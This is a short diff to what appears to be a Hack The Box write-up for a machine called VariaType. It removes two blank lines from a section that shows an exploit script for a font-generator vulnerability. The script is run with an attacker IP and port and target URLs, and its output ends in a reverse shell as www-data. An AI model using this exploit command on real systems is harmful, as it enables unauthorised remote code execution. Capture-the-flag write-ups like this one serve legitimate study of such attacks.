@@ -1361,7 +1361,6 @@ if __name__ == "__main__":
 **Result:**
 
 ```shell
-                                                                                                                             
 ┌──(kali㉿kali)-[~/…/HTB/SN10/VariaType/varlib-cve-2025-66034]
 └─$ python3 varlib_cve_2025_66034.py --ip 10.10.14.71 --port 4444 --path /var/www/portal.variatype.htb/public/files --trigger http://portal.variatype.htb/files --url http://variatype.htb/tools/variable-font-generator/process
 [INFO] [+] Generating compatible master fonts...
@@ -1377,7 +1376,6 @@ if __name__ == "__main__":
 bash: cannot set terminal process group (3343): Inappropriate ioctl for device
 bash: no job control in this shell
 www-data@variatype:~/portal.variatype.htb/public/files$ 
-
 ```
 <div align="center">
 <br>
